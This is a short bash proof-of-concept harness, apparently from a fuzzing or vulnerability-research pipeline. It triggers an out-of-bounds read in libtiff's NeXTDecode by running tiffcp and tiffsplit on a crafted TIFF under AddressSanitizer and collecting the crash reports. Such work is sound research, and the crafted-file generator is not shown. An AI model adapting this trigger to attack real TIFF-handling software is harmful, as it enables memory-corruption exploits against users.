#!/bin/bash
# PoC run script for VULN 001: NeXTDecode OOB Read (tif_next.c CWE-125)
#
# NOTE: tiffsplit uses TIFFReadRawStrip which bypasses the decode path, so it
# cannot trigger NeXTDecode.  tiffcp uses TIFFReadEncodedStrip -> NeXTDecode
# and is used here to actually trigger the vulnerability.  tiffsplit is also
# run for completeness as specified in the task template.
set -euo pipefail
cd "/data/ylwang/non-textfuzz/target/_poc/libtiff/libtiff_tif_next_c"

[ -f vuln_001.tif ] || python3 vuln_001_gen.py

# --- tiffsplit (template-required; does not decode, so no ASAN expected) ---
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
  /data/ylwang/non-textfuzz/target/libtiff/build_test/bin/tiffsplit \
  vuln_001.tif /tmp/tiffsplit_out_ > vuln_001_result.txt 2>&1 || true

# --- tiffcp: actually triggers NeXTDecode -> heap-buffer-overflow ----------
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
  /data/ylwang/non-textfuzz/target/libtiff/build_test/bin/tiffcp \
  vuln_001.tif /tmp/tiffcp_out.tif >> vuln_001_result.txt 2>&1 || true

# --- collect ASAN reports --------------------------------------------------
for f in ./asan.log.*; do
  [ -f "$f" ] && grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" \
    >> vuln_001_result.txt || true
done
